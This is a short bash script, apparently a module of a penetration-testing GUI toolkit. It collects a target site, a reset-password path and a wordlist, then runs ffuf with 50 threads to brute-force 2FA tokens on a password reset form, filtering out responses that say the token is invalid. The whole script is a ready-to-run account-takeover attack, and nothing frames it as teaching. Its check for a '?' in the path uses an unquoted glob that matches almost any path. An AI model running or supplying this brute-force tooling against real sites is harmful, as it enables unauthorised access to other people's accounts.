#!/bin/bash

: '
ffuf: fuzz 2fa tokens on password reset form
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
WEBSITE_FIELD=$(form_item "website" "website")
WEBSITE_PATH_FIELD=$(form_item "path" "website_path" "reset_password.php?token=FUZZ")
FILTER_STRING_FIELD=$(form_item "filter string" "filter_string" "The provided token is invalid")
WORDLIST_FIELD=$(form_item "wordlist" "wordlist" "2fa_codes.txt")

# Generate GUI form
generate_form "${WEBSITE_FIELD}" "${WEBSITE_PATH_FIELD}" "${FILTER_STRING_FIELD}" "${WORDLIST_FIELD}"

WEBSITE=${form_data["website"]}
WEBSITE_PATH=${form_data["website_path"]}
FILTER_STRING=${form_data["filter_string"]}
WORDLIST=${form_data["wordlist"]}

if [[ "${WEBSITE}" != */ ]]; then
    WEBSITE+="/"
fi

if [[ "${WEBSITE_PATH}" != *?* ]]; then
    WEBSITE_PATH="?${WEBSITE_PATH}"
fi

WEBSITE+="${WEBSITE_PATH}"

execute_command "ffuf -w ${WORDLIST}:FUZZ -u '${WEBSITE}' -fr '${FILTER_STRING}' -v -t 50"
create_new_line

